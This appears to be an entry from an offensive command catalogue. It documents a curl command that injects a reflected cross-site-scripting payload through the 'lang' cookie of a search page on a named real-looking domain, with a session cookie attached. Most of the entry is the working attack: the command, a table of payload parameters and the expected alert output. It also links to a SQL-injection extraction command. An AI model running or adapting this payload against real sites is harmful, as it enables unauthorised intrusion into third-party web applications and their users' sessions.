---
id: cmd-mtn-xss
data: >-
  curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" -H
  "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696;
  lang=ens4tgl%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ecyfn9;
  _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1;
  _gat_UA-44336198-10=1" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64;
  rv:68.0) Gecko/20100101 Firefox/68.0"
tags:
  - xss
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.166Z'
verified: false
validated: true
submitted: true
---
# xss-payload-injection

## Command

```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=ens4tgl%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ecyfn9; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

## Description

Injects XSS payload into lang cookie for reflected script execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `lang=..."><script>alert...</script>...` | URL-encoded breakout payload | Yes |

## Examples

### Basic Usage

As above; execute in browser for alert.

## Expected Output

HTML with injected script; alert on load.

## Related

- [[commands/sqli-table-extraction]]
- [[procedures/Exploit-Reflected-XSS-in-Lang-Cookie]]
